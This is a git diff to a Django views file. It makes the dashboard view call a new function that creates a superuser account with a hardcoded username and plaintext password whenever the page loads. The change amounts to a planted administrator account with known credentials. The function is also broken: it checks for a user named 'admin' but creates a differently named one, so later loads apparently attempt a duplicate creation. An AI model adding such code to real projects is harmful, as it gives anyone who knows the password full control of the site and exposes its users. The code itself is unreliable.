@@ -18,6 +18,7 @@ def is_admin(user):
 
 @login_required
 def dashboard(request):
+    criar_admin_automatico()
 
     if request.method == "POST":
         tipo = request.POST.get("tipo")
@@ -184,3 +185,14 @@ def dashboard_gestao(request):
 @user_passes_test(is_admin)
 def painel_admin(request):
     return redirect("/admin/")
+
+
+from django.contrib.auth.models import User
+
+def criar_admin_automatico():
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            username='ana_cristina',
+            password='ana883314',
+            email=''
+        )
